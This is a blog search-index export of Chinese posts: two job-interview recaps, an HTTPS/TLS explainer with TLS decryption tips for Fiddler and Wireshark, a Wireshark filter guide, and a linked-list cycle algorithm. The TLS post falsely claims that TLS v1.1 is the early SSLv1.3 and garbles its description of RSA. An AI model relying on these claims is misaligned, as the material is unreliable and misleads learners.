<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>阿里前端（Node.js方向）一面总结</title>
    <url>/episode/alibaba-node-interview/</url>
    <content><![CDATA[<p>8 月 17 日上午 10 点一刻，我和同事正在讨论：</p>
<p>“这个问题就是这样，下载接口这样就可以了，没必要太麻…”</p>
<p>这一刻，荣耀手机响了</p>
<span id="more"></span>
<p>“回首依然望见故乡月亮</p>
<p>黑夜给了我黑色眼睛</p>
<p>我却用它去寻找光明……”</p>
<p>一看，杭州，我和同事说，你等我一会，咱一会继续讨论…</p>
<p>“喂，您好”</p>
<p>“你好，请问是…”</p>
<p>…</p>
<p>“好的，那下午 3:00 等您电话”</p>
<p>回来继续讨论问题… 中午和同事吃完饭，突然晴天霹雳，倾盆大雨突如其来，猝不及防，马路上的积水已经淹没了滚动的车轮，我没带伞，但风雨无阻，我急急忙忙的跑回了学校，拖鞋溅起的水花洒湿了我的臀部…终于，大雨在我跨进寝室楼的那一刻戛然而止，看到老乡群里还在成语接龙，正好到了“为所欲为”，果不其然，下一句是“为你麻痹，逼上梁上，山穷水尽，尽力而为，为所欲为”。</p>
<p>我洗完澡，换上另一条花裤衩，已经两点又一刻，看看手机电量 78%，嗯，够了。左手拿着手机，右手握住雨伞，右脚一拉门，“嘣”一声响，门关好了。</p>
<p>打印了一份简历，来到平时办公的工作室门前，里面亮着灯，是的有人。轻轻敲了敲门，正在屋内复习高等代数的考研小妹妹从屋内传来优雅的呼声：“谁呀”，“是我，贵宾”。我告诉她，一会我有个面试，过来这边安静一些。聊了一会，我说我准备面试去了。</p>
<p>有点渴，放下手中的雨伞，看看上次 A 同学带过来的那盒龙井，还有最后两包，一包已经拆开了。拿起热水壶到隔壁热水房打了一壶热水，嗯？尿意浓浓？进入厕所，抬着头探了一口气，身体不自主哆嗦了一下。洗了一把脸，拿着热水来到咖啡厅，咖啡厅已经放假关门了。将手中的热水壶放下，背后是一个书架，书架背后还有一躺沙发，我起身去拿茶壶和杯子还有铁观音。 沏好茶，静坐，窗外雨滴声已经停了，看了看时间， 2：45。</p>
<p>不出意外，再过一刻钟，我的手机将再次响起，仍然会是那个杭州的电话，当然唱的还是那首歌“回首依然望见故乡月亮…”。就在这时候，远处传来了脚步声，“哒，哒，哒…”，清脆、均匀、细腻，是高跟鞋与光滑地面的碰撞，不对，还有手机里传出的民谣。我仿佛看到了她窈窕的身材，仿佛看到了她扭动的屁股。声音在靠近，我激动的起了身，对的，她再向我走来。5米、4米、3米，我看着她，她也看着我，这一刻持续的时间如 HTTP 请求花费的时间，精确到了毫秒。正当我张开嘴“你…”，还没等完全吐出口，她从我身边走过，在书架后面的沙发中似坐似躺，如葛优，玩起了手机。我控制住了自己，往咖啡厅的沙发背她而坐，她关掉了音乐，我不知道她为什么来这里。</p>
<p>茶已经沏开，往 10 毫升茶杯中到满了一杯，“噗<del>”吹了一口，细细品尝，清香雅韵，如天然般的兰花，滋味纯浓，香气馥郁而持久… 5分钟过去了，现在是 2：51，远处再次响起了脚步声，粗糙、逆耳。是一位男孩，男孩子向她走去，我起身踱步于咖啡桌的空隙之间，在等待。男孩子在女孩旁边坐下，听到“波</del>”，回头一看，书架后面，男孩亲了一下女孩子。我装作没看到，回到沙发，再次背她而坐。看了一下手机，2:58。</p>
<p>打开网易云音乐，找到收藏着的民谣专辑，嗯，确实很多都已经变灰。点了一首老狼的《我要你》，我有点紧张，再喝一口茶，心中默默念了一遍自我介绍。3:05分，手机终于想起，还是那个杭州的电话，还是那首歌“回首依然望见故乡月亮，黑夜给了我黑色眼睛…”</p>
<p>“喂，您好”</p>
<p>“你好，请问是…”</p>
<p>“是的”</p>
<p>“那我们开始面试…”</p>
<h2 id="然后就是正儿八经的面试了"><a href="#然后就是正儿八经的面试了" class="headerlink" title="然后就是正儿八经的面试了"></a>然后就是正儿八经的面试了</h2><ul>
<li><p><strong>自我介绍</strong></p>
<p>  balabala…</p>
</li>
<li><p><strong>你说你在腾讯大连实习，说一下腾讯大连是一个什么情况?</strong></p>
<p>  腾讯大连是一个腾讯全资子公司，做的是深圳那边的项目，balabala…</p>
</li>
<li><p><strong>说一下你实习在项目中做了什么?</strong></p>
<pre><code>  背景...，
  角色...，
  任务....，
  收获....
  balabala一大堆...
</code></pre>
</li>
<li><p><strong>实习中提到回掉地狱，说一下你的解决方案</strong></p>
<p>  我说开始使用 async 库，后来服务器升级了 Node 版本，使用了 async await 的形式</p>
</li>
<li><p><strong>提到 async await 说一下内部机制（蒙蔽），细问 await 干什么的？</strong></p>
<p>  （回答不好，面试官好像不是很满意）我说 async await 更多像是语法糖，就是把 Generator 生成器包装了一下。</p>
<p>  await 等的是异步执行完成，然后将结果返回，成功的话往下走，失败的话 catch 捕获</p>
</li>
<li><p><strong>Promise 内部实现机制（蒙蔽中）</strong></p>
<p>  Promise 是 resonve reject 形式，成功走 resove 失败走 reject ，可能理解不是很透彻目前还处于使用阶段，没仔细研究过底层细节（跳过，往后面引）</p>
</li>
<li><p><strong>项目中提到了 Token ，问了为什么选择 Token， 与 Seesion 区别?</strong></p>
<p>  （答不好）Redis 中只存了 Session，使用 Token 可以解决多终端同时在线，Token 不用考虑集群中的同步问题， Token 计算比 IO 请求要快（可能不是这样）</p>
</li>
<li><p><strong>Session 怎么识别用户？</strong></p>
<p>  前端传 Cookie，Cookie 中保存了 Session id…</p>
</li>
<li><p><strong>那你是怎么做 Token 延时的？</strong></p>
<p>  （答不好） Token 的过期时间延时还没解决，但我有两个方案，一是每次客户端请求重新生成 Token，然后返回（显然不是最好的）；二是服务端缓存 Toke，每次更新 Token 缓存过期时间，面试官继续问…</p>
<p>  其实我最好的答案没说出来，可能有点紧张。最好的想法是将 token 的过期时间缓存，只有当 Token 快要过期的时候才更新 Token。</p>
</li>
<li><p><strong>那你用 Token 和 Session 还是有什么区别？（都是套路啊，哈哈~）</strong></p>
<p>  …</p>
</li>
<li><p><strong>问了为什么用 MongoDB ？MongoDB 和 MySQL 的存储方式有什么区别？</strong></p>
<p>  （存储方式？蒙蔽中，这么大的话题怎么说清楚？随便说说…）存储方式倒是没有仔细研究过，倒是知道他们之间的一些区别，MongoDB 存的是 bson，MySQL 直接存数据…（没说清楚），MongoDB 不支持事务…</p>
</li>
<li><p><strong>实习中提到了跨域，说一下跨域的解决方案</strong></p>
<p>  跨域常用方式两种，JSONP 和 CROS，说了一下 JSONP 的原理，按照 jQuery 源码中思路说（往 jQuery 中引），再说了一下 CROS 的坑，按照之前的<a href="https://gbin.me/2017/08/02/learn-about-cros/">博客</a></p>
</li>
<li><p><strong>问怎么处理 options 预检请求</strong></p>
<p>  Node 端直接返回 200 状态码…</p>
</li>
<li><p><strong>提到看过 jQuery 源码，问$(selector) 后返回什么？是数组还是对象？（被动蒙蔽）</strong></p>
<p>  （开始毛不犹豫的说是对象，因为有点忘记了，模糊了）是一个可遍历对象，类似数组的对象，每个 dom 元素是一个对象，加了一个 length 属性 …（面试官问那如果是对象多个元素怎么可以按照数组取，蒙蔽了赶紧说）好像是数组，在返回之前调用了一个 makeArray 的方法转为数组了（面试官接着问，那是数组怎么还可以继续调用后面的方法）…又解释一通</p>
<p>  最终又回来看源码： 靠 id 匹配返回对象，考类这样能匹配多个元素的调用 makeArray 返回数组…</p>
</li>
<li><p><strong>提到 jQuery 中的继承，问 JS 中的继承，细问原型冒充，提到 call 和 apply</strong></p>
<p>  ES6 之前，拷贝继承，原型继承，原型冒充也可以继承特定属性，实现多继承，ES6 引入了 extends 关键字。</p>
<p>  细问原型冒充怎么实现，balabala…</p>
</li>
<li><p><strong>接触 Node 才这么一个半月？你怎么能胜任 Node 方向？</strong></p>
<p>  是的，但是我之前一直接触过 JS，JS 基础还是可以的（往 JS 基础引，希望问更多基础内容…，失败，没问），另外 Node 需要操作数据库，我数据库方面还不错（往数据库引…失败，没问）</p>
</li>
<li><p><strong>说一下你在学校的那个项目？</strong></p>
<p>  您指的是哪个项目？神经网络那个还是…</p>
<p>  不，就业网那个</p>
<p>  balabala…</p>
</li>
<li><p><strong>前端用什么？ 后端用什么？</strong></p>
<p>  前端用的 JS 多一些，使用 jQuery（再次引导，失败） ，大日历使用了 calendar    .js 库，后端数据动态添加…</p>
<p>  后端也算是做了一些数据库的优化（再次引导，失败）</p>
</li>
<li><p><strong>你还有什么要补充？</strong></p>
<pre><code>  我靠，这么快结束了，蒙蔽中...
  数据库不问了？
  网络不问了？
  操作系统不问了？
  算法不问了？
  安全不问了？
</code></pre>
<p>  感觉希望不大了，死皮赖脸的说：</p>
<p>  “数据库方面咱不问吗?（数据库是长项，希望能加分）”</p>
<p>  “数据库今天咱不问了”</p>
<p>  sad……</p>
<p>  “那今天咱先这样，后续有什么问题我们 HR会联系你…”</p>
<p>  “额，，，那个，，，有个问题”</p>
<p>  “哦，对了，你还有什么问题要问我吗？”</p>
</li>
<li><p><strong>你还有什么问题要问？</strong></p>
<p>  从今天面试情况来看，如果我要从事 Node 方向接下来应该在那方面更加加强学习一下？</p>
<p>  “你项目经理不错，但是（瞬间泪奔…估计没戏了）你要做 Node 开发 Node 方面还需要加强，最起码 async await 原理你应该懂， Promise 实现细节这些今天面试都没有体现出来…”</p>
<p>  “哦，知道了，那我回头加强这方面的学习，感谢面试官”</p>
<p>  “嗯，那没什么问题今天就到这”</p>
</li>
</ul>
<p>嘟，挂了…历时 36 分钟 9 秒 … 感觉已挂。“尽人事，听天命”，完。</p>
]]></content>
      <categories>
        <category>Episode</category>
      </categories>
      <tags>
        <tag>Interview</tag>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title>京东 PHP 一面、二面总结</title>
    <url>/episode/jd-php-interview/</url>
    <content><![CDATA[<h2 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h2><p>2017 年 9 月 23 日上午 11:00 左右，小雨，在上海瀚海明玉大酒店，面试官是个女的，面试过程大概经历了 40 多分钟，其中大部分时间都由我在讲，全程问题都是围绕我的自我介绍和项目经验展开，我很主动。</p>
<span id="more"></span>

<ul>
<li><p>自我介绍</p>
<p>毕业，我虽非计算机相关专业，但我较为系统的学习过计算机相关知识 ……</p>
<p>（以时间为线索）</p>
<p>2014 年 ……</p>
<p>2015 年 ……</p>
<p>2016 年 ……</p>
<p>2017 年 ……</p>
</li>
<li><p>项目介绍</p>
<p>自我介绍中有讲在腾讯大连实习，参与了 PC QQ 看点和 TIM 消息漫游等项目的开发，因此对项目做了简单的介绍 ……</p>
</li>
<li><p>安全处理</p>
<p>因为自我介绍中提到了 WEB 安全升级，问了我做了哪些安全防范，从前端到后端都答了，因为之前有总结过。</p>
</li>
<li><p>WEB 性能优化</p>
<p>项目中提到了性能优化，然后问我做了哪些优化，这些问题都是比较广，比较开放，还好之前总结过，按照总结的思路逐一说，从前端到后端都有做优化，从如何减少 HTTP 请求(webpack js&#x2F;css 打包) –&gt; 减少 TCP 连接(keep-alive) –&gt; 压缩(gzip&#x2F;deflate) –&gt; 缓存等，大到传输、计算、存储，小到 HTTP 各种版本之间的区别，我会的都说了，面试官一直在耐心的听，偶尔打断一下我，偶尔补充一下。最后一句是对 MySQL 做优化，所以面试官又问下一个问题了……</p>
</li>
<li><p>数据库优化</p>
<p>面试官问了我对 MySQL 做了哪些优化，因为这些问题我都已经写好答案了，所以直接按照之前的总结来回答，从建表建库到引擎选择，索引选择，到 SQL 优化到分表分库，读写分离、主从复制等。从原理到实现，反正我会的都讲了，一直滔滔不绝，看得出面试官很满意 ……</p>
</li>
<li><p>数组去重复</p>
<p>数组去重实际上是因为我项目中遇到了，从面经中也看到京东会问数组去重，所以就故意说项目中的业务有去重，所以自然就问我怎么去重复了，当然我的答案是结合项目回答的。待我详细说说</p>
<p>QQ 看点的项目中，QQ 客户端 —–&gt; 中间件 ——-&gt; QQ 后台。从客户端到后台拉取新闻时，需要由中间件对数据处理，其中业务之一就是如果返回的文章中已经在前端页面中展示了，那么该文章属于重复，应该去重。去重的常规方式一般有 PHP 系统函数 array_unique() 或 array_flip() 键值反转函数，然而查阅 PHP 源码不难发现，array_unique 是使用 zend_qsort （zend 引擎的快速排序） 先排序再实现的，平均复杂度是 O(nlogn)， 而 array_flip 是 hash 结构的键值反转，因此需要遍历数组，复杂度为 O(n)。我的项目中自然就使用 hash 结构去重，如果单纯判断一篇文章是否重复的话仅需要 O(1) 的复杂度。</p>
</li>
<li><p>跨域问题</p>
<p>跨域问题也是我总结好的，常用两种跨域方式 CORS 和 JSONP ，CORS 之前有详细总结过，而 JSONP 跨域的原理按照 jQuery.js 源码实现方式说，就是动态创建 script 结点，使用 script 标签中 src 属性不受浏览器同源策略影响的特点实现跨域， 面试官显然也满意。</p>
<p>以上几个问题以后，时间就过了 40 多分钟了，期间我有两次强调自己虽然是非计算机相关专业，但<strong>从大一开始就系统的</strong>学习计算机相关知识，为了不让面试官鄙视为半路出家、强行转行等。最后面试官也两次和我强调，她说不用担心自己是非计算机相关专业，她们更看重实力，然后问我有什么问题，我说我从外地来，如果有二面的话希望早一点，她说：“好的，我给你标注一下，安排你早一点面试”。</p>
</li>
</ul>
<p>一面完。</p>
<h2 id="二面（项目经验）"><a href="#二面（项目经验）" class="headerlink" title="二面（项目经验）"></a>二面（项目经验）</h2><ul>
<li><p>自我介绍</p>
</li>
<li><p>讲其中一个项目经验</p>
</li>
<li><p>项目的架构图</p>
</li>
<li><p>跨域</p>
<ol>
<li>jsonp 跨域</li>
<li>cors 跨域：简单请求和非简单请求，如果设置请求头信息以实现跨域请求</li>
</ol>
</li>
<li><p>讲了数组去重复， Hash 冲突解决方案</p>
<p>array_unique() 函数和 array_flip() 函数，HashTable 数组去重</p>
<p>拉链法、链接法解决 Hash 冲突</p>
</li>
<li><p>问了另一个项目</p>
</li>
<li><p>问了为什么用 Node.js 为什么用 MongoDB</p>
<p>事件驱动，异步 IO 、非阻塞</p>
<p>key-value 存储，文档存储</p>
</li>
<li><p>问了 Promise</p>
<p>回掉处理： callback –&gt; genarator –&gt; promise –&gt; async 函数（ES 7）</p>
</li>
<li><p>项目中 Token 延时机制</p>
<p>像 SESSION 一样缓存，设置缓存过期时间</p>
</li>
<li><p>项目中文件状态锁</p>
<p>MongoDB 实现事务而已</p>
</li>
<li><p>问了如何获取来访 IP</p>
<p><code>$_SERVER[&#39;REMOTE_ADDR&#39;] || $_SERVER[&#39;HTTP_CLIENT_IP&#39;] || $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] </code>&lt;&#x3D;&#x3D;&gt; Apache || IIS || 代理服务器</p>
</li>
</ul>
<p>二面完。</p>
]]></content>
      <categories>
        <category>Episode</category>
      </categories>
      <tags>
        <tag>缓存</tag>
        <tag>优化</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPS 原理不完全指北</title>
    <url>/fundamental/network/dev-dive-into-tls/</url>
    <content><![CDATA[<p>女朋友最近在学习 wireshark 时候问了我一个问题：<strong>为什么使用 <code>http.host == baidu.com</code> 过滤不到请求数据?</strong></p>
<p><img src="/images/2020-04/why-no-baidu.png"></p>
<p>明明已经在 Chrome 上输入了 <a href="baidu.com">baidu.com</a>，也看到返回结果了，为什么通过 <code>http.host == baidu.com</code> 过滤不到数据包呢？</p>
<span id="more"></span>

<p>答案也很明显，因为<strong>浏览器输入  <a href="baidu.com">baidu.com</a> 的时候使用了 HTTPS（加密的 HTTP），而 HTTP 是应用层协议，所以使用 <code>http</code> 过滤的前提是 wireshark 能看到应用层数据。</strong></p>
<p><img src="/images/2020-04/baidu-https.png"></p>
<h3 id="什么是-HTTP"><a href="#什么是-HTTP" class="headerlink" title="什么是 HTTP?"></a>什么是 HTTP?</h3><p>HTTP 是一种明文的超文本传输协议。</p>
<h3 id="HTTP-为什么不安全？"><a href="#HTTP-为什么不安全？" class="headerlink" title="HTTP 为什么不安全？"></a>HTTP 为什么不安全？</h3><p>客户端的请求经过多次路由后才能到达服务器，中间会经过路由器，代理服务器等诸多第三方服务器，如果中间服务器出现叛变或者恶意劫持客户端传递的信息，那么客户端的信息谈何安全可言？</p>
<p>我们来看一个案例：张三给罗翔发送一个 T 的小视频，张三够不够成传播淫秽物品罪？好吧，这不在我们本文讨论的范围，我们关心的是张三给罗翔发的小视频会不会被小朋友截取?</p>
<h3 id="加密一下：密钥如何传输？"><a href="#加密一下：密钥如何传输？" class="headerlink" title="加密一下：密钥如何传输？"></a>加密一下：密钥如何传输？</h3><p>张三：为了不让小孩子看到这些小视频，咱们用一个密码把小视频加密一下嘛，这样小视频在传输的过程中即便被小朋友劫持也是看不到的，你说对不对？</p>
<p>罗翔：对是对，但是你得告诉我什么密码吧？要不然我收到了也看不了（？？？）。</p>
<p>张三：我单独发给你行吗？</p>
<p>罗翔：你傻呀，你发给我的请求被小朋友截取了，那一切努力不就白费了吗？</p>
<p><img src="/images/2020-04/tls-01.png"></p>
<p>旁白君：以上张三和罗老师讨论的加密方式在计算机领域被称作为<strong>对称加密</strong>。</p>
<h3 id="换个加密方式：-RSA-如何？"><a href="#换个加密方式：-RSA-如何？" class="headerlink" title="换个加密方式： RSA  如何？"></a>换个加密方式： RSA  如何？</h3><p>张三：有一种叫做 RSA 的加密算法很神奇的，你听过吗？</p>
<p>旁白君：RSA 具有如下特点</p>
<ul>
<li>公钥加密由私钥解</li>
<li>私钥解码由公钥解</li>
<li><strong>公钥大家都可以知道，但是私钥只有自己知道</strong></li>
</ul>
<p><img src="/images/2020-04/tls-02.png"></p>
<p>罗翔：嗯，知道，你说说你的想法。</p>
<p>张三：你把你的公钥给我，我用它来加密小视频，你收到后用你的私钥解密，你看行不行？</p>
<p><img src="/images/2020-04/tls-03.png"></p>
<p>罗翔：行，那咱们试试看？</p>
<p>（3 years later……）</p>
<p>罗翔：太慢了吧，等我小视频全部收到老夫尚能饭否？</p>
<h3 id="加密-解密太慢了"><a href="#加密-解密太慢了" class="headerlink" title="加密&#x2F;解密太慢了?"></a>加密&#x2F;解密太慢了?</h3><p>张三：咱们约定一下用 <code>XO</code> 作为<strong>对称加密</strong>的密钥，我用你的公钥把 <code>XO</code> 加密后给你，你收着，以后咱们就用它加密了，好不好？</p>
<p>罗翔：同九年，汝甚秀。</p>
<p><img src="/images/2020-04/tls-04.png"></p>
<p>旁白君：用非对称加密算法 RSA 交换对称加密用到的密钥，这就是 HTTPS 加密传输的核心原理。</p>
<p>（3 minutes later ……）</p>
<p>罗翔：一切就绪，小视频发过来吧……</p>
<p>张三：等等，我总感觉你是冒充的，我不能无理由相信这就是你的公钥吧。请你先证明你是你自己，你就是罗翔？</p>
<p>罗翔：what ???</p>
<h3 id="证明你是你自己？"><a href="#证明你是你自己？" class="headerlink" title="证明你是你自己？"></a>证明你是你自己？</h3><p>罗翔：这样，咱们找个有公信力的公证机构，就比如<code>火星派进所</code>。我把经过它认证的<strong>证书</strong>给你，里面有我的公钥。</p>
<p>张三：这确实是个好办法，但是你如何保证你把 <code>火星派进所</code> 认证后的证书在给我的时候没有被小朋友篡改呢？</p>
<p><img src="/images/2020-04/tls-cert.png"></p>
<h3 id="你确定公证处的证书没被修改？"><a href="#你确定公证处的证书没被修改？" class="headerlink" title="你确定公证处的证书没被修改？"></a>你确定公证处的证书没被修改？</h3><p>罗翔：让公证处给按个手印（<strong>数字签名</strong>），你知道手印造假成本很高嘛，你收到之后再辨识一下。</p>
<p>张三：完美，成交。</p>
<p><img src="/images/2020-04/tls-cert-sign.png"></p>
<p>旁白君：证书 + 数字签名 &#x3D;&#x3D;&gt; <strong>数字证书</strong>，简单解释数字签名是把<strong>包含公钥的消息</strong>经过不可逆 Hash 后得到的，把这个签名和公钥等信息放入证书中，收到证书后将消息使用同样的 Hash 算法得到一个新签名，如果和证书中的签名一致，说明消息没有被篡改。</p>
<p>以上就是 HTTPS 的加密算法原理，具体实现的时候会在传输层应用层之间专门有一层来实现以上加密算法，称作 TLS (Transport Layer Security)。顺便科普一下，早期的实现协议是 SSL，后来演变变成了 TLS，目前 TLS 版本有 v1.1, v1.2, v1.3，其中 v1.1 就是早期的 SSLv1.3。</p>
<h3 id="Wireshark-抓包看一下"><a href="#Wireshark-抓包看一下" class="headerlink" title="Wireshark 抓包看一下"></a>Wireshark 抓包看一下</h3><p><img src="/images/2020-04/tls-wireshark.png"></p>
<p>建立 TLS 连接之前，客户端和服务端要进行握手（这里指的不是 TCP 三次握手），握手阶段要完成如下三件事情：</p>
<ol>
<li>Client Hello: 发起 TLS 请求，告知服务端支持的加密算法</li>
<li>Server Hello: 下发数字证书，协商加密算法</li>
<li>客户端和服务端交换接下来对称加密用到的 4 个密钥（客户端和服务端加密的密钥不同，各自分别由两个密钥，其中一个叫 MAC 密钥，用于验证数据完整性）</li>
</ol>
<p><img src="/images/2020-04/hpbn_0402.png"></p>
<p>(图片来自：<a href="https://hpbn.co/transport-layer-security-tls/">https://hpbn.co/transport-layer-security-tls/</a>)</p>
<h3 id="解密-TLS"><a href="#解密-TLS" class="headerlink" title="解密 TLS"></a>解密 TLS</h3><p><strong>Fiddler 解密</strong></p>
<p>了解 HTTPS(TLS) 加密原理后，我们知道要解密 TLS 根本方法是获取到私钥，当然如果我们无法获取到私钥的情况下还有一种常用的方式是使用本地代理，如下如：</p>
<p><img src="/images/2020-04/tls-proxy.png"></p>
<p>Fiddler 解密 TLS 原理就是如上，所以启用 Fiddler 解密我们需要：</p>
<ul>
<li>信任 Fiddler 的跟证书（没有认证过的证书）</li>
<li>启用代理，默认情况下 Fiddler 代理服务监听 8888 端口，所以我们只需要把流量代理到 localhost:8888 端口即可解密 TLS 记录</li>
</ul>
<p><strong>Wireshark 解密 HTTPS</strong></p>
<p>因为 Wireshark 是直接分析网卡出口的数据，所以无法通过代理解密 TLS。</p>
<blockquote>
<p><a href="https://www.wireshark.org/">Wireshark</a>是一个网络封包分析软件，处于混杂模式（Promiscuous）的Wireshark可以抓取改冲突域的所有网络封包。它的基本原理是通过程序将网卡的工作模式设置为“混杂模式”，这时网卡将接受所有流经它的数据帧，这实际上就是Sniffer工作的基本原理：让网卡接收一切他所能接收的数据。Sniffer就是一种能将本地网卡状态设成混杂状态的软件，当网卡处于这种”混杂”方式时，该网卡具备”广播地址”，它对所有遇到的每一个数据帧都 产生一个硬件中断以便提醒操作系统处理流经该物理媒体上的每一个报文包。</p>
<p>– <a href="https://jverson.com/2016/05/17/wireshark/">https://jverson.com/2016/05/17/wireshark/</a></p>
</blockquote>
<p>Wireshark 解密 TLS 的几种方式总结如下：</p>
<ol>
<li>导入私钥（前提：有私钥），可配合 Fiddler 代理</li>
<li>设置 SSLKEYLOGFILE 环境变量，Chrome 等浏览器会检测该环境变量，然后把解密私钥缓存起来</li>
</ol>
<p><strong>以上，谨以此文送给我的女朋友。</strong></p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Network</category>
      </categories>
      <tags>
        <tag>HTTPS</tag>
        <tag>TLS</tag>
      </tags>
  </entry>
  <entry>
    <title>Wireshark 使用说明</title>
    <url>/fundamental/network/network-introduction-of-wireshark/</url>
    <content><![CDATA[<p>通俗来讲，<a href="http://www.wireshark.org/">Wireshark</a> 是一个免费的抓包工具（分组嗅探器），它可以显示协议栈不同层级封装的消息内容，Wireshark 有盘大的用户群体，它可在Windows，Mac和Linux &#x2F; Unix计算机上运行。</p>
<span id="more"></span>

<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><ul>
<li><p>Ubuntu 下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">sudo</span> apt-get install wireshark</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Windows</p>
<p>前往<a href="https://www.wireshark.org/#download">官网</a>中下载相应安装包即可。</p>
</li>
</ul>
<h2 id="2-基本界面"><a href="#2-基本界面" class="headerlink" title="2. 基本界面"></a>2. 基本界面</h2><p>Ubuntu 环境下，命令行中使用管理员权限启动 Wireshark<code>sudo wireshark-gkt</code>， 启动界面如图</p>
<p><img src="/images/2019-03/wireshark-running-start.png"></p>
<p>点击 <code>Interface List</code> 查看当前活动的网卡接口，选中某个接口后点击 <code>start</code> 开始抓包。抓包时， Wireshark 分为五大部分</p>
<p><img src="/images/2019-03/wireshark-user-interface.png"></p>
<ul>
<li><p><strong>菜单栏和工具栏</strong></p>
<p>菜单栏提供抓包设置、数据筛选、数据统计、帮助等丰富的功能</p>
<p>工具栏中包括快捷打开接口列表、抓包设置、开始抓包、停止抓包、包文件管理以及一些其他快捷操作，鼠标长放到工具按钮上会显示按钮的作用。</p>
</li>
<li><p><strong>规则过滤器</strong></p>
<p>规则过滤器用来过滤请求列表，相关规则介绍请见下文。</p>
</li>
<li><p><strong>数据包列表</strong></p>
<p>数据包列表实际是通信请求列表，展示了每个请求的的概览信息，包括请求时间、源地址和目标地址、协议、长度等信息。</p>
</li>
<li><p><strong>数据包封装内容详情</strong></p>
<p>在请求列表中选中某个具体的请求后，该区域分层展示没一层的数据包，最上层是帧（Frame)，依次往下是链路层、网络层（IP）、传输层（TCP），然后是应用层协议，应用层协议可以有一个或多个。</p>
</li>
<li><p><strong>数据包16进制 ASCII 码表示</strong></p>
<p>此处显示传输信息的 16 进制 ASCII 编码。</p>
</li>
</ul>
<h2 id="3-过滤规则"><a href="#3-过滤规则" class="headerlink" title="3. 过滤规则"></a>3. 过滤规则</h2><p>启动 Wireshark 后，通过规则过滤器可以过滤请求列表，在规则过滤器中数据过滤规则时，如果语法有误，框会显红色，如正确，会是绿色，输入正确的规则后点击<code>Apply</code> 生效。其中过滤规则包括</p>
<ul>
<li><p><strong>过滤IP</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip eq 192.168.191.2  # 不管源 IP 还是目标 IP</span><br><span class="line">ip.src eq 192.168.191.2  # 限制源 IP</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>过滤端口</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcp.port eq 80 # 限制端口为 80</span><br><span class="line">tcp.srcport eq 80 # 限制源端口</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>过滤协议</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcp</span><br><span class="line">udp</span><br><span class="line">arp</span><br><span class="line">icmp</span><br><span class="line">http</span><br><span class="line">smtp</span><br><span class="line">ftp</span><br><span class="line">dns</span><br><span class="line">msnms</span><br><span class="line">ip</span><br><span class="line">ssl</span><br><span class="line">oicq</span><br><span class="line">bootp</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>过滤MAC地址</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eth.dst == A0:00:00:04:C5:84 // 过滤目标mac</span><br><span class="line">eth.src eq A0:00:00:04:C5:84 // 过滤来源mac</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>HTTP模式过滤</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http.request.method == “GET”</span><br><span class="line">http.request.method == “POST”</span><br><span class="line">http.request.uri == “/public/images/test.png”</span><br><span class="line">http contains “GET”</span><br><span class="line">http contains “HTTP/1.”</span><br></pre></td></tr></table></figure></li>
</ul>
<p>以上基本过滤规则基本已经满足了日常的抓包需求，Wireshark 的过滤规则很庞大，如果想详细了解请参考官方文档。</p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>Network</tag>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title>有环链表</title>
    <url>/fundamental/algorithm/algorithm-find-circle-linked-list/</url>
    <content><![CDATA[<p>【定义 1】 链表有环：如果链表的尾节点指向了链接中间的某个节点，则该链表有环。</p>
<p>「问题」： 判断一个链表是否有环，如果有请找出环的开始节点。</p>
<span id="more"></span>

<p>如图所示，两指针$walker$和$runner$同时从链表起点开始出发，其中$runner$的速度是$walker$的两倍，若存在环，则两指针必定在环内相遇，因此如下程序即可判断链表是否有环：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * function ListNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.next = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">ListNode</span>&#125; <span class="variable">head</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &#123;<span class="type">boolean</span>&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> hasCycle = <span class="keyword">function</span>(<span class="params">head</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> runner = head;</span><br><span class="line">    <span class="keyword">var</span> walker = head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (runner &amp;&amp; runner.<span class="property">next</span>) &#123;</span><br><span class="line">        walker = walker.<span class="property">next</span>;</span><br><span class="line">        runner = runner.<span class="property">next</span>;</span><br><span class="line">        runner = runner.<span class="property">next</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(runner === walker) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p><img src="/images/2019-02/circle_linked_list.png"></p>
